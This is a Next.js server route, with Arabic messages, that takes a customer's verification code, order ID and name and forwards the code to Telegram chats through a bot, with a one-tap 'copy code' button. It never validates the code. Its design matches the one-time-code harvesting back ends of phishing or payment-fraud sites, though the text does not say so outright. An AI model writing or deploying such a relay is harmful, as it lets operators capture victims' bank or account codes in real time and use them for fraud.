import { NextRequest, NextResponse } from "next/server";

// In-memory store: orderId → { count, firstAt, lastAt }
const attempts = new Map<string, { count: number; firstAt: number; lastAt: number }>();

const MAX_ATTEMPTS = 5;
const WINDOW_MS = 10 * 60 * 1000;

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  if (!code || !orderId) {
    return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
  }

  const now = Date.now();
  const key = String(orderId).slice(0, 64);
  const entry = attempts.get(key);

  if (entry) {
    // Reset window if expired
    if (now - entry.firstAt > WINDOW_MS) {
      attempts.delete(key);
    } else {
      if (entry.count >= MAX_ATTEMPTS) {
        return NextResponse.json({ ok: false, error: "تجاوزت الحد المسموح من المحاولات" }, { status: 429 });
      }
      entry.count += 1;
      entry.lastAt = now;
    }
  }

  if (!attempts.has(key)) {
    attempts.set(key, { count: 1, firstAt: now, lastAt: now });
  }

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
    .split(",").map((id: string) => id.trim()).filter(Boolean);
  let sent = false;
  for (const chatId of chatIds) {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text,
            reply_markup: {
              inline_keyboard: [
                [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
              ],
            },
          }),
        }
      );
      if (res.ok) sent = true;
    } catch {}
  }

  return NextResponse.json({ ok: sent });
}
